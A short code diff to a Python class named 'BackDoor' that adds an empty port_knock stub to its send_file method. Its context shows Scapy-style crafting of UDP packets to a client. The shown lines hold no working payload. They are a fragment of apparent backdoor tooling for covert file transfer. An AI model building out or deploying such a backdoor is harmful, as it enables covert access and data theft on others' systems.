@@ -221,6 +221,10 @@ class BackDoor:
 
     def send_file(self):
         print(f"sending {self.path}")
+        self.port_knock()
+
+    def port_knock(self):
+        pass
     def craft_packet(self, msg: str):
         ip = IP(dst=self.client)
         udp = UDP(sport=RandShort(), dport=self.send_port)
